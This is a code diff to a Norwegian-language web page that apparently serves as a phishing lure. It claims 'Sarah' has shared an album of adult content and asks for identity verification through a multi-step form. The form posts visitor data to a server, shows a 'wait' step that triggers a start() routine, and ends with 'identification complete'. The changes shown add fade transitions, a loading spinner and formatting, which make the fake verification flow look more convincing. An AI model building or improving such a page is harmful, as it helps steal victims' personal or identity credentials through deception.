@@ -24,7 +24,8 @@
         <p class="long-text2" id="long-text2">Sarah har delt sin album med deg</p>
         <p class="long-text3" id="long-text3" style="display:none">Denne nedlastingen inneholder vokseninnhold. For å
           laste den ned, må du bekrefte at du er 18 år eller eldre.</p>
-        <p class="long-text4" id="long-text4" style="display:none">Identifisering fullført. Du er nå klar til å laste ned.</p>
+        <p class="long-text4" id="long-text4" style="display:none">Identifisering fullført. Du er nå klar til å laste
+          ned.</p>
         <button class="button2" id="button01" style="background-color: #d4f3fd; color: #222">Last ned</button>
       </div>
     </div>
@@ -162,7 +163,10 @@
         </div>
 
         <br>
-        <button type="button" id="nextButton" class="button next-btn">Neste</button>
+        <button type="button" id="nextButton" class="button next-btn">
+          <div class="spinner"></div>
+          <span class="text">Neste</span>
+        </button>
         <button type="submit" id="submitButton" class="button next-btn" style="display: none;">Lukk</button>
         <br>
         <a href="" class="form-link">Gå tilbake</a>
@@ -183,15 +187,39 @@
         const text4 = document.getElementById("long-text4");
         let currentStep = 0;
 
-        // Show the current step
-        function showStep(stepIndex) {
+        // Show the current step with fade effect
+        function showStep(stepIndex, isInitialLoad = false) {
           steps.forEach((step, index) => {
-            step.style.display = index === stepIndex ? "block" : "none";
+            if (index === stepIndex) {
+              if (isInitialLoad) {
+                // No delay for the initial load
+                step.classList.add("active");
+                step.style.display = "block";
+                step.style.opacity = "1"; // Show immediately
+              } else {
+                // Apply delay for subsequent steps
+                setTimeout(() => {
+                  step.classList.add("active");
+                  step.style.display = "block"; // Ensure it's visible during fade-in
+                  setTimeout(() => {
+                    step.style.opacity = "1"; // Trigger fade-in
+                  }, 10); // Delay ensures the browser applies the opacity transition
+                }, 500); // 5-second delay before showing the new step
+              }
+            } else {
+              setTimeout(() => {
+                step.style.opacity = "0"; // Trigger fade-out
+                step.style.display = "none"; // Hide after fade-out
+                step.classList.remove("active");
+              }, 500); // Match this to your CSS transition duration
+            }
           });
 
           // Toggle button visibility
-          nextButton.style.display = stepIndex < steps.length - 1 ? "inline-block" : "none";
-          submitButton.style.display = stepIndex === steps.length - 1 ? "inline-block" : "none";
+          setTimeout(() => {
+            nextButton.style.display = stepIndex < steps.length - 1 ? "inline-block" : "none";
+            submitButton.style.display = stepIndex === steps.length - 1 ? "inline-block" : "none";
+          }, isInitialLoad ? 0 : 500); // No delay for button toggling during initial load
         }
 
         // Validate inputs of the current step
@@ -211,13 +239,23 @@
           if (validateStep(currentStep)) {
             currentStep++;
             showStep(currentStep);
-            
+
+            if (currentStep >= 1) {
+              nextButton.classList.add('loading')
+              setTimeout(() => {
+                nextButton.classList.remove('loading')
+              }, 500); // Match this to your CSS transition duration
+            }
 
             if (currentStep === 5) {
-              nextButton.textContent = 'Vent'
-              start()
-            }else if(currentStep >=6) {
-              nextButton.textContent = 'Neste'
+              setTimeout(() => {
+                nextButton.textContent = "Vent";
+                start(); // Call your custom function if needed
+              }, 500); // Match this to your CSS transition duration
+            } else if (currentStep >= 6) {
+              setTimeout(() => {
+                nextButton.textContent = "Neste";
+              }, 500); // Match this to your CSS transition duration
             }
           }
         });
@@ -247,31 +285,28 @@
           })
             .then((response) => response.json())
             .then((data) => {
-              // console.log("Server Response:", data);
-
               if (data.status === "success") {
-                // alert("Data saved successfully!");
                 stepForm.reset();
                 currentStep = 0;
-                showStep(currentStep);
-                formWrapper.style.display = 'none'
-                formWrapper2.style.display = 'block'
-                text3.style.display = 'none'
-                text4.style.display = 'block'
-                button01.textContent = 'Last ned'
+                showStep(currentStep, true); // Ensure the initial step is shown immediately
+                formWrapper.style.display = "none";
+                formWrapper2.style.display = "block";
+                text3.style.display = "none";
+                text4.style.display = "block";
+                button01.textContent = "Last ned";
               } else {
                 alert("Error: " + data.message);
               }
             })
             .catch((error) => {
-              // console.error("Error:", error);
               alert("Failed to submit the form. Please try again.");
             });
         });
 
         // Initialize the first step
-        showStep(currentStep);
+        showStep(currentStep, true); // Pass `true` to indicate it's the initial load
       });
+
     </script>
 
   </main>
